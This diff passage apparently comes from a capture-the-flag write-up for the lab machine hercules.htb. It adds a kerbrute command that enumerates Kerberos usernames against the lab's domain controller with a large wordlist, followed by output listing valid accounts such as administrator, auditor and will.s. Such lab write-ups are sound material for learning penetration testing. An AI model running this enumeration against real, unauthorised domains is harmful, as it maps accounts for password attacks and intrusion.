@@ -184,3 +184,25 @@ Kerbrute found the username `auditor` and since i know this logon portal is usin
 
 Kerbrute has just found the name `will.s`
 
+```python
+kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/11/26 - Ronnie Flathers @ropnop
+
+2026/09/11 18:19:15 >  Using KDC(s):
+2026/09/11 18:19:15 >  	dc.hercules.htb:88
+
+2026/09/11 18:19:15 >  [+] VALID USERNAME:	admin@hercules.htb
+2026/09/11 18:19:18 >  [+] VALID USERNAME:	administrator@hercules.htb
+2026/09/11 18:19:18 >  [+] VALID USERNAME:	Admin@hercules.htb
+2026/09/11 18:19:36 >  [+] VALID USERNAME:	Administrator@hercules.htb
+2026/09/11 18:20:02 >  [+] VALID USERNAME:	auditor@hercules.htb
+2026/09/11 18:22:05 >  [+] VALID USERNAME:	ADMIN@hercules.htb
+2026/09/11 18:43:15 >  [+] VALID USERNAME:	will.s@hercules.htb
+```
